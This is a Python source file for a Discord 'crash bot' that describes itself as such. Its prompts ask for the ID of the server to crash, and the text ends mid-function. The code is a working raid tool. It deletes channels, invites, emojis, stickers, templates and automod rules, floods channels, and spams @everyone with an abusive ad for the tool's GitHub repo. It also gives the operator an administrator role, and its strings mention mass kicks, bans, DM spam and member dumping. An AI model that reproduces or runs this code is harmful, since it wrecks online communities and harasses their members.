from pystyle import Colors, Box, Write, Center
import nextcord
from nextcord.ext import commands
import asyncio
import json
import os
import aiohttp
import requests
import random
import datetime
import subprocess
import webbrowser
from tools.console_version import *
import time

intents = nextcord.Intents.default()
intents.members = True
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix='!', intents=intents)
bot.current_activity = None
bot.current_status = None
bot.is_ready_event = asyncio.Event()

symbols = 'abcdefghijklmnopqrstuvwxyz0123456789'
crash_discord_ad = '@everyone\nYOU WAS BOMBED AS IN IRAC\nDOWNLOAD SAME CRASH:https://github.com/kittenello/Discord-Crasher'
crash_discord_ad_pm = 'FUCKED BY CRASH DISCORD BY 3033 TEAM\nDOWNLOAD SAME CRASH:https://github.com/kittenello/Discord-Crasher'

# Load language from setup.json
if os.path.exists("configs/setup.json"):
    with open("configs/setup.json", 'r', encoding='utf-8') as f:
        setup = json.load(f)
    language = setup.get('LANGUAGE', 'ru')  # Default to Russian if not set
else:
    language = 'ru'  # Fallback to Russian if setup.json doesn't exist

# Language-specific texts
texts = {
    "ru": {
        "config_missing": "\n>> Кажется, конфиг был удален/перемещен, поэтому я тебя перенаправляю в первичную настройку...",
        "server_id_not_found": "\n>> SERVER_ID не найден в configs/setup.json",
        "server_not_found": "\n>> Сервер с ID: {server_id} не найден",
        "rename_server_prompt": "\n>> Введите новое название сервера (или нажмите Enter для случайного названия): ",
        "error": "\n>> Произошла ошибка: {error}",
        "no_templates": "\n>> Не найдено шаблонов на сервере",
        "template_deleted": "\n>> Шаблон {template_code} удален",
        "no_permission_template": "\n>> Отсутствуют права на удаление шаблона: {template_code}",
        "template_not_found": "\n>> Шаблон {template_code} не найден",
        "template_error": "\n>> Ошибка удаления шаблона {template_code}: {error}",
        "no_invites": "\n>> Не найдено инвайтов на сервере",
        "invite_deleted": "\n>> Инвайт {invite_code} удален",
        "no_permission_invite": "\n>> Отсутствуют права на удаление инвайта: {invite_code}",
        "invite_not_found": "\n>> Инвайт {invite_code} не найден",
        "invite_error": "\n>> Ошибка удаления инвайта {invite_code}: {error}",
        "no_emojis": "\n>> Не найдено эмодзи на сервере",
        "emoji_deleted": "\n>> Эмодзи {emoji_name} удален",
        "no_permission_emoji": "\n>> Отсутствуют права на удаление эмодзи: {emoji_name}",
        "emoji_not_found": "\n>> Эмодзи {emoji_name} не найден",
        "emoji_error": "\n>> Ошибка удаления эмодзи {emoji_name}: {error}",
        "no_stickers": "\n>> Не найдено стикеров на сервере",
        "sticker_deleted": "\n>> Стикер {sticker_name} удален",
        "no_permission_sticker": "\n>> Отсутствуют права на удаление стикера: {sticker_name}",
        "sticker_not_found": "\n>> Стикер {sticker_name} не найден",
        "sticker_error": "\n>> Ошибка удаления стикера {sticker_name}: {error}",
        "no_automod_rules": "\n>> Не найдено правил автомодерации, создаю новое правило...",
        "automod_rule_deleted": "\n>> Правило автомодерации {rule_name} удалено",
        "no_permission_automod": "\n>> Отсутствуют права на удаление правила: {rule_name}",
        "automod_not_found": "\n>> Правило {rule_name} не найдено",
        "automod_error": "\n>> Ошибка удаления правила {rule_name}: {error}",
        "spam_count_prompt": "\n>> Введите количество сообщений для спама (или нажмите Enter для случайного количества от 1 до 100): ",
        "spam_everyone_note": "\n>> @everyone пишется автоматически в начале сообщения.",
        "spam_text_prompt": "\n>> Введите текст для спама: ",
        "spam_channel_id_prompt": "\n>> Введите ID канала для спама (или нажмите Enter для использования текущего канала): ",
        "channel_not_found": "\n>> Канал с ID: {channel_id} не найден или не является текстовым каналом",
        "flood_channels_count": "\n>> Введите количество каналов (или нажмите Enter для случайного количества от 10 до 50): ",
        "flood_channels_name": "\n>> Введите название канала (или нажмите Enter для случайного названия): ",
        "admin_user_id_prompt": "\n>> Введите ID пользователя, которому нужно назначить права администратора (или нажмите Enter для использования USER_ID из конфига): ",
        "admin_role_created": "\n>> Роль {role_name} создана и назначена пользователю {user_name}",
        "admin_user_not_found": "\n>> Пользователь с ID: {user_id} не найден на сервере",
        "icon_not_found": "\n>> Файл иконки icons/icon.png не найден",
        "icon_updated": "\n>> Иконка сервера обновлена!",
        "icon_url_error": "\n>> Не удалось получить изображение по URL",
        "rename_roles_name_prompt": "\n>> Введите новое название для всех ролей (или нажмите Enter для случайного названия): ",
        "rename_users_name_prompt": "\n>> Введите новый никнейм для всех пользователей (или нажмите Enter для случайного никнейма): ",
        "activity_prompt": "\n>> Выберите активность\n",
        "activity_option": "\n>> {key}. {activity_name}",
        "activity_type_prompt": "\n>> Выберите номер активности >> ",
        "status_prompt": "\n>> Выберите статус >>\n",
        "status_option": "\n>> {key}. {status_name}",
        "status_type_prompt": "\n>> Введите номер статуса >> ",
        "activity_name_prompt": "\n>> Введите имя активности >> ",
        "activity_set": "\n>> Готово! Поставлены следующие значения:",
        "activity_details": "\n>> Активность: {activity_name}, Статус: {status_name}, Имя: {activity_name_input}\n",
        "rename_channels_name_prompt": "\n>> Введите новое название для всех каналов (или нажмите Enter для случайного названия): ",
        "flood_category_count": "\n>> Введите количество категорий (или нажмите Enter для случайного количества от 10 до 50): ",
        "flood_category_name": "\n>> Введите название категории (или нажмите Enter для случайного названия): ",
        "flood_roles_count": "\n>> Введите количество ролей (или нажмите Enter для случайного количества): ",
        "flood_roles_name": "\n>> Введите название роли (или нажмите Enter для случайного названия): ",
        "flood_server_timer": "\n>> Введите время (в секундах) между изменениями названия (или нажмите Enter для 10 секунд): ",
        "flood_server_mode": "\n>> 1 - Динамическое, 2 - Разное\n>> Выберите режим (1/2): ",
        "flood_server_name": "\n>> Введите название сервера: ",
        "flood_server_name_missing": "\n>> Название сервера не введено",
        "flood_server_names": "\n>> Введите название {index} (или нажмите Enter для завершения ввода): ",
        "flood_server_names_missing": "\n>> Названия не введены",
        "flood_server_invalid_mode": "\n>> Неверный режим. Введите '1' или '2'.",
        "exception_prompt": "\n>> Введите ID пользователя, которого хотите добавить в исключения: ",
        "exception_added": "\n>> Пользователь {user_id} добавлен в исключения!",
        "exception_exists": "\n>> Этот пользователь уже есть в исключениях.",
        "exception_error": "\n>> Ошибка при добавлении в исключения: {error}",
        "config_menu_title": "\n=== ИЗМЕНЕНИЕ КОНФИГУРАЦИИ ===\n",
        "config_user_id": "\n1. ID личного аккаунта: {user_id}",
        "config_bot_id": "\n2. ID бота: {bot_id}",
        "config_token": "\n3. Токен бота: {token} (имя: {bot_name})",
        "config_server": "\n4. ID сервера: {server_id} (имя: {server_name})",
        "config_exit": "\n5. Вернуться назад\n",
        "config_choice_prompt": "\n>> Введите номер пункта для изменения: ",
        "config_invalid_choice": "\n>> Неверный выбор. Попробуй снова.",
        "config_new_user_id": ">> Новый ID личного аккаунта: ",
        "config_new_bot_id": ">> Новый ID бота: ",
        "config_new_token": ">> Новый токен бота: ",
        "config_new_server_id": ">> Новый ID сервера: ",
        "config_updated": "\n>> Конфигурация обновлена!\n",
        "dump_users_saved": "\n>> Сохранено {count} пользователей в: {folder}",
        "dump_users_error": "\n>> Ошибка при сборе пользователей: {error}",
        "kick_user": "\n>> Пользователь {user_name} ({user_id}) кикнут",
        "ban_user": "\n>> Пользователь {user_name} ({user_id}) забанен",
        "flood_pm_text": "\n>> Введите текст для спама в ЛС (или нажмите Enter для текста по умолчанию): ",
        "version_check_fail": "\n>> Не удалось получить актуальную версию скрипта.",
        "error_connecting": "\n>> Ошибка при подключении к GitHub: {error}",
        "version_up_to_date": "\n>> У вас установлена актуальная версия {version}",
        "version_outdated": "\n>> Ваша версия: {local_version}, доступна новая: {remote_version}",
        "update_prompt": "\n>> Хотите перейти на страницу скачки? [Y/N]: ",
        "confirm_decline": "\n>> Вы точно отказываетесь? Это может вызвать ошибки, подтвердите еще раз [Y/N]: ",
        "declined_update": "\n>> Вы отказались от обновления, возможно будут ошибки в скрипте.\n",
        "flood_mass_pm_count": "\n>> Введите кол-во сообщений (или нажмите Enter для случайного количества от 5 до 15): ",
        "flood_mass_pm_text": "\n>> Введите текст для массовой рассылки в ЛС (или нажмите Enter для текста по умолчанию): ",
        "random_roles_count": "\n>> Введите количество ролей (или нажмите Enter для случайного количества от 10 до 50): ",
        "random_roles_name": "\n>> Введите название роли (или нажмите Enter для случайного названия): ",
        "random_roles_assigned": "\n>> Роль {role_name} создана и назначена пользователю {user_name}",
        "random_roles_no_users": "\n>> Нет доступных пользователей для назначения роли",
        "soft_confirm_server": ">> Вы хотите крашнуть сервер {server_name} - {server_id}, верно? [Y/N]: ",
        "soft_new_server_id": ">> Введите ID сервера, который хотите крашнуть: ",
        "soft_exceptions_choice": "\n>> Y - Загрузить, N - Базовые\n>> Вы хотите загрузить исключения из файла или оставить базовые? [Y/N]: ",
        "soft_exceptions_not_found": ">> Файл configs/exceptions.json не найден, используем базовые.\n",
        "soft_command_prompt": "\n>> Введите номер функции >> ",
        "soft_invalid_command": "\nНеверная команда",
        "soft_continue_prompt": "\n>> Нажмите Enter для продолжения >> ",
        "soft_info": "\nЭто краш-бот для дискорда.\nЧтобы закинуть бота, нужно создать бота, закинуть токен, ваш id, бот id и id сервера в софт",
        "soft_info_ok": "\n>> Ok >> ",
        "bot_connected": "Бот подключился как {bot_user}"
    },
    "en": {
        "config_missing": "\n>> It seems the config was deleted/moved, redirecting to initial setup...",
        "server_id_not_found": "\n>> SERVER_ID not found in configs/setup.json",
        "server_not_found": "\n>> Server with ID: {server_id} not found",
        "rename_server_prompt": "\n>> Enter new server name (or press Enter for a random name): ",
        "error": "\n>> An error occurred: {error}",
        "no_templates": "\n>> No templates found on the server",
        "template_deleted": "\n>> Template {template_code} deleted",
        "no_permission_template": "\n>> No permission to delete template: {template_code}",
        "template_not_found": "\n>> Template {template_code} not found",
        "template_error": "\n>> Error deleting template {template_code}: {error}",
        "no_invites": "\n>> No invites found on the server",
        "invite_deleted": "\n>> Invite {invite_code} deleted",
        "no_permission_invite": "\n>> No permission to delete invite: {invite_code}",
        "invite_not_found": "\n>> Invite {invite_code} not found",
        "invite_error": "\n>> Error deleting invite {invite_code}: {error}",
        "no_emojis": "\n>> No emojis found on the server",
        "emoji_deleted": "\n>> Emoji {emoji_name} deleted",
        "no_permission_emoji": "\n>> No permission to delete emoji: {emoji_name}",
        "emoji_not_found": "\n>> Emoji {emoji_name} not found",
        "emoji_error": "\n>> Error deleting emoji {emoji_name}: {error}",
        "no_stickers": "\n>> No stickers found on the server",
        "sticker_deleted": "\n>> Sticker {sticker_name} deleted",
        "no_permission_sticker": "\n>> No permission to delete sticker: {sticker_name}",
        "sticker_not_found": "\n>> Sticker {sticker_name} not found",
        "sticker_error": "\n>> Error deleting sticker {sticker_name}: {error}",
        "no_automod_rules": "\n>> No auto-moderation rules found, creating a new rule...",
        "automod_rule_deleted": "\n>> Auto-moderation rule {rule_name} deleted",
        "no_permission_automod": "\n>> No permission to delete rule: {rule_name}",
        "automod_not_found": "\n>> Rule {rule_name} not found",
        "automod_error": "\n>> Error deleting rule {rule_name}: {error}",
        "spam_count_prompt": "\n>> Enter the number of messages to spam (or press Enter for a random number from 1 to 100): ",
        "spam_everyone_note": "\n>> @everyone is automatically added to the start of the message.",
        "spam_text_prompt": "\n>> Enter the text to spam: ",
        "spam_channel_id_prompt": "\n>> Enter the channel ID to spam (or press Enter to use the current channel): ",
        "channel_not_found": "\n>> Channel with ID: {channel_id} not found or is not a text channel",
        "flood_channels_count": "\n>> Enter the number of channels (or press Enter for a random number from 10 to 50): ",
        "flood_channels_name": "\n>> Enter the channel name (or press Enter for a random name): ",
        "admin_user_id_prompt": "\n>> Enter the user ID to grant admin permissions (or press Enter to use USER_ID from config): ",
        "admin_role_created": "\n>> Role {role_name} created and assigned to user {user_name}",
        "admin_user_not_found": "\n>> User with ID: {user_id} not found on the server",
        "icon_not_found": "\n>> Icon file icons/icon.png not found",
        "icon_updated": "\n>> Server icon updated!",
        "icon_url_error": "\n>> Failed to retrieve image from URL",
        "rename_roles_name_prompt": "\n>> Enter new name for all roles (or press Enter for a random name): ",
        "rename_users_name_prompt": "\n>> Enter new nickname for all users (or press Enter for a random nickname): ",
        "activity_prompt": "\n>> Select activity\n",
        "activity_option": "\n>> {key}. {activity_name}",
        "activity_type_prompt": "\n>> Select activity number >> ",
        "status_prompt": "\n>> Select status >>\n",
        "status_option": "\n>> {key}. {status_name}",
        "status_type_prompt": "\n>> Enter status number >> ",
        "activity_name_prompt": "\n>> Enter activity name >> ",
        "activity_set": "\n>> Done! Set the following values:",
        "activity_details": "\n>> Activity: {activity_name}, Status: {status_name}, Name: {activity_name_input}\n",
        "rename_channels_name_prompt": "\n>> Enter new name for all channels (or press Enter for a random name): ",
        "flood_category_count": "\n>> Enter the number of categories (or press Enter for a random number from 10 to 50): ",
        "flood_category_name": "\n>> Enter the category name (or press Enter for a random name): ",
        "flood_roles_count": "\n>> Enter the number of roles (or press Enter for a random number): ",
        "flood_roles_name": "\n>> Enter the role name (or press Enter for a random name): ",
        "flood_server_timer": "\n>> Enter the time (in seconds) between name changes (or press Enter for 10 seconds): ",
        "flood_server_mode": "\n>> 1 - Dynamic, 2 - Different\n>> Select mode (1/2): ",
        "flood_server_name": "\n>> Enter server name: ",
        "flood_server_name_missing": "\n>> Server name not provided",
        "flood_server_names": "\n>> Enter name {index} (or press Enter to finish input): ",
        "flood_server_names_missing": "\n>> No names provided",
        "flood_server_invalid_mode": "\n>> Invalid mode. Enter '1' or '2'.",
        "exception_prompt": "\n>> Enter the user ID to add to exceptions: ",
        "exception_added": "\n>> User {user_id} added to exceptions!",
        "exception_exists": "\n>> This user is already in exceptions.",
        "exception_error": "\n>> Error adding to exceptions: {error}",
        "config_menu_title": "\n=== CONFIGURATION CHANGE ===\n",
        "config_user_id": "\n1. User ID: {user_id}",
        "config_bot_id": "\n2. Bot ID: {bot_id}",
        "config_token": "\n3. Bot token: {token} (name: {bot_name})",
        "config_server": "\n4. Server ID: {server_id} (name: {server_name})",
        "config_exit": "\n5. Go back\n",
        "config_choice_prompt": "\n>> Enter the number of the item to change: ",
        "config_invalid_choice": "\n>> Invalid choice. Try again.",
        "config_new_user_id": ">> New user ID: ",
        "config_new_bot_id": ">> New bot ID: ",
        "config_new_token": ">> New bot token: ",
        "config_new_server_id": ">> New server ID: ",
        "config_updated": "\n>> Configuration updated!\n",
        "dump_users_saved": "\n>> Saved {count} users to: {folder}",
        "dump_users_error": "\n>> Error collecting users: {error}",
        "kick_user": "\n>> User {user_name} ({user_id}) kicked",
        "ban_user": "\n>> User {user_name} ({user_id}) banned",
        "flood_pm_text": "\n>> Enter text for PM spam (or press Enter for default text): ",
        "version_check_fail": "\n>> Failed to retrieve the latest script version.",
        "error_connecting": "\n>> Error connecting to GitHub: {error}",
        "version_up_to_date": "\n>> You are running the latest version {version}",
        "version_outdated": "\n>> Your version: {local_version}, new version available: {remote_version}",
        "update_prompt": "\n>> Would you like to visit the download page? [Y/N]: ",
        "confirm_decline": "\n>> Are you sure you want to decline? This may cause errors, confirm again [Y/N]: ",
        "declined_update": "\n>> You declined the update, errors may occur in the script.\n",
        "flood_mass_pm_count": "\n>> Enter the number of messages (or press Enter for a random number from 5 to 15): ",
        "flood_mass_pm_text": "\n>> Enter text for mass PM spam (or press Enter for default text): ",
        "random_roles_count": "\n>> Enter the number of roles (or press Enter for a random number from 10 to 50): ",
        "random_roles_name": "\n>> Enter the role name (or press Enter for a random name): ",
        "random_roles_assigned": "\n>> Role {role_name} created and assigned to user {user_name}",
        "random_roles_no_users": "\n>> No available users to assign the role",
        "soft_confirm_server": ">> Do you want to crash server {server_name} - {server_id}? [Y/N]: ",
        "soft_new_server_id": ">> Enter the ID of the server you want to crash: ",
        "soft_exceptions_choice": "\n>> Y - Load, N - Basic\n>> Do you want to load exceptions from file or use basic ones? [Y/N]: ",
        "soft_exceptions_not_found": ">> File configs/exceptions.json not found, using basic exceptions.\n",
        "soft_command_prompt": "\n>> Enter the function number >> ",
        "soft_invalid_command": "\nInvalid command",
        "soft_continue_prompt": "\n>> Press Enter to continue >> ",
        "soft_info": "\nThis is a Discord crash bot.\nTo use the bot, you need to create a bot, provide its token, your ID, bot ID, and server ID in the software.",
        "soft_info_ok": "\n>> Ok >> ",
        "bot_connected": "Bot connected as {bot_user}"
    }
}

lang_text = texts[language]

if not os.path.exists("configs/setup.json"):
    Write.Print(lang_text["config_missing"], Colors.red_to_blue, interval=0)
    time.sleep(10)
    subprocess.run(["python", "firstsetup.py"])
    exit(0)
else:
    with open("configs/setup.json", 'r', encoding='utf-8') as f:
        setup = json.load(f)

user_id = setup['USER_ID']
bot_id = setup['BOT_ID']
TOKEN = setup['TOKEN']
server_id = setup['SERVER']
exception_ids = [
    bot_id,
    user_id
]
base_exceptions = [
    bot_id,
    user_id
]

@bot.event
async def on_ready():
    print(lang_text["bot_connected"].format(bot_user=bot.user))
    if bot.current_activity and bot.current_status:
        await bot.change_presence(
            activity=bot.current_activity,
            status=bot.current_status
        )
    bot.is_ready_event.set()
    await soft.run()

@bot.command(name='rename_server')
async def rename_server(ctx, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if name is None:
            name = Write.Input(lang_text["rename_server_prompt"], Colors.red_to_blue, interval=0)
        
        server_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
        await guild.edit(name=server_name)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='delete_templates')
async def delete_templates(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        templates = await guild.templates()
        if not templates:
            Write.Print(lang_text["no_templates"], Colors.red_to_blue, interval=0)
            return
        
        for template in templates:
            try:
                await template.delete()
                Write.Print(lang_text["template_deleted"].format(template_code=template.code), Colors.green_to_yellow, interval=0)
            except nextcord.Forbidden:
                Write.Print(lang_text["no_permission_template"].format(template_code=template.code), Colors.red_to_blue, interval=0)
            except nextcord.NotFound:
                Write.Print(lang_text["template_not_found"].format(template_code=template.code), Colors.red_to_blue, interval=0)
            except nextcord.HTTPException as e:
                Write.Print(lang_text["template_error"].format(template_code=template.code, error=e), Colors.red_to_blue, interval=0)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='delete_invite')
async def delete_invite(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        invites = await guild.invites()
        if not invites:
            Write.Print(lang_text["no_invites"], Colors.red_to_blue, interval=0)
            return
        
        for invite in invites:
            try:
                await invite.delete(reason="IRAC")
                Write.Print(lang_text["invite_deleted"].format(invite_code=invite.code), Colors.green_to_yellow, interval=0)
            except nextcord.Forbidden:
                Write.Print(lang_text["no_permission_invite"].format(invite_code=invite.code), Colors.red_to_blue, interval=0)
            except nextcord.NotFound:
                Write.Print(lang_text["invite_not_found"].format(invite_code=invite.code), Colors.red_to_blue, interval=0)
            except nextcord.HTTPException as e:
                Write.Print(lang_text["invite_error"].format(invite_code=invite.code, error=e), Colors.red_to_blue, interval=0)
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='delete_emoji')
async def delete_emoji(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        emojis = guild.emojis
        if not emojis:
            Write.Print(lang_text["no_emojis"], Colors.red_to_blue, interval=0)
            return
        
        for emoji in emojis:
            try:
                await emoji.delete(reason="https://github.com/kittenello/Discord-Crasher")
                Write.Print(lang_text["emoji_deleted"].format(emoji_name=emoji.name), Colors.green_to_yellow, interval=0)
            except nextcord.Forbidden:
                Write.Print(lang_text["no_permission_emoji"].format(emoji_name=emoji.name), Colors.red_to_blue, interval=0)
            except nextcord.NotFound:
                Write.Print(lang_text["emoji_not_found"].format(emoji_name=emoji.name), Colors.red_to_blue, interval=0)
            except nextcord.HTTPException as e:
                Write.Print(lang_text["emoji_error"].format(emoji_name=emoji.name, error=e), Colors.red_to_blue, interval=0)
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='delete_stickers')
async def delete_stickers(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        stickers = guild.stickers
        if not stickers:
            Write.Print(lang_text["no_stickers"], Colors.red_to_blue, interval=0)
            return
        
        for sticker in stickers:
            try:
                await sticker.delete(reason="https://github.com/kittenello/Discord-Crasher")
                Write.Print(lang_text["sticker_deleted"].format(sticker_name=sticker.name), Colors.green_to_yellow, interval=0)
            except nextcord.Forbidden:
                Write.Print(lang_text["no_permission_sticker"].format(sticker_name=sticker.name), Colors.red_to_blue, interval=0)
            except nextcord.NotFound:
                Write.Print(lang_text["sticker_not_found"].format(sticker_name=sticker.name), Colors.red_to_blue, interval=0)
            except nextcord.HTTPException as e:
                Write.Print(lang_text["sticker_error"].format(sticker_name=sticker.name, error=e), Colors.red_to_blue, interval=0)
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='delete_automod')
@commands.has_permissions(manage_guild=True)
async def delete_automod(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            await ctx.send(lang_text["server_id_not_found"])
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            await ctx.send(lang_text["server_not_found"].format(server_id=target_server_id))
            return
        
        auto_mod_rules = await guild.auto_moderation_rules()
        if not auto_mod_rules:
            try:
                rule = await guild.create_auto_moderation_rule(
                    name="https://github.com/kittenello/Discord-Crasher",
                    trigger_type=nextcord.AutoModerationTriggerType.spam,
                    event_type=nextcord.AutoModerationEventType.message_send,
                    actions=[nextcord.AutoModerationAction(type=nextcord.AutoModerationActionType.block_message)]
                )
                Write.Print(lang_text["no_automod_rules"], Colors.red_to_blue, interval=0)
            except Exception as e:
                Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)
        
        auto_mod_rules = await guild.auto_moderation_rules()
        for rule in auto_mod_rules:
            try:
                await rule.delete(reason="https://github.com/kittenello/Discord-Crasher")
                Write.Print(lang_text["automod_rule_deleted"].format(rule_name=rule.name), Colors.green_to_yellow, interval=0)
            except nextcord.Forbidden:
                Write.Print(lang_text["no_permission_automod"].format(rule_name=rule.name), Colors.red_to_blue, interval=0)
            except nextcord.NotFound:
                Write.Print(lang_text["automod_not_found"].format(rule_name=rule.name), Colors.red_to_blue, interval=0)
            except nextcord.HTTPException as e:
                Write.Print(lang_text["automod_error"].format(rule_name=rule.name, error=e), Colors.red_to_blue, interval=0)
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='spam_channels')
async def spam_channels(ctx, count: int = 0, *, text: str = ""):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return

        if count == 0:
            count_input = Write.Input(lang_text["spam_count_prompt"], Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(1, 100)

        if not text:
            Write.Print(lang_text["spam_everyone_note"], Colors.red_to_blue, interval=0)
            text = Write.Input(lang_text["spam_text_prompt"], Colors.red_to_blue, interval=0)

        final_text = f"@everyone\n{text.strip()}" if text.strip() else crash_discord_ad

        channels = guild.text_channels
        for _ in range(count):
            for channel in channels:
                try:
                    await channel.send(final_text)
                except Exception as e:
                    Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='spam_channel')
async def spam_channel(ctx, channel_id: int = None, count: int = 0, *, text: str = ""):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return

        if channel_id is None:
            channel_id_input = Write.Input(lang_text["spam_channel_id_prompt"], Colors.red_to_blue, interval=0)
            if channel_id_input:
                channel_id = int(channel_id_input)
            else:
                channel_id = ctx.channel.id

        channel = guild.get_channel(channel_id)
        if not channel or not isinstance(channel, nextcord.TextChannel):
            Write.Print(lang_text["channel_not_found"].format(channel_id=channel_id), Colors.red_to_blue, interval=0)
            return

        if count == 0:
            count_input = Write.Input(lang_text["spam_count_prompt"], Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(1, 100)
        
        if not text:
            text = Write.Input(lang_text["spam_text_prompt"], Colors.red_to_blue, interval=0)

        final_text = f"@everyone\n{text.strip()}" if text.strip() else crash_discord_ad

        for _ in range(count):
            try:
                await channel.send(final_text)
            except Exception as e:
                Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='delete_channels')
@commands.has_permissions(manage_channels=True)
async def delete_channels(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        rules_channel = guild.rules_channel
        rules_channel_id = rules_channel.id if rules_channel else None
        
        public_updates_channel = guild.public_updates_channel
        public_updates_channel_id = public_updates_channel.id if public_updates_channel else None
        
        channels = await guild.fetch_channels()
        for channel in channels:
            if channel.id == rules_channel_id:
                continue
            
            if channel.id == public_updates_channel_id:
                continue
            
            await channel.delete()
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='flood_channels')
@commands.has_permissions(manage_channels=True)
async def flood_channels(ctx, count: int = 0, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if count == 0:
            count = random.randint(10, 50)
        
        for _ in range(count):
            channel_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
            await guild.create_text_channel(name=channel_name)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='full_admin')
@commands.has_permissions(manage_roles=True)
async def full_admin(ctx, user_id: int = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if user_id is None:
            user_id_input = Write.Input(lang_text["admin_user_id_prompt"], Colors.red_to_blue, interval=0)
            if user_id_input:
                user_id = int(user_id_input)
            else:
                user_id = int(setup.get('USER_ID'))
        
        role_name = ''.join(random.choice(symbols) for _ in range(20))
        permissions = nextcord.Permissions()
        permissions.administrator = True
        role = await guild.create_role(name=role_name, permissions=permissions)
        user = guild.get_member(user_id)
        if user:
            await user.add_roles(role)
            Write.Print(lang_text["admin_role_created"].format(role_name=role_name, user_name=user.name), Colors.green_to_yellow, interval=0)
        else:
            Write.Print(lang_text["admin_user_not_found"].format(user_id=user_id), Colors.red_to_blue, interval=0)
    
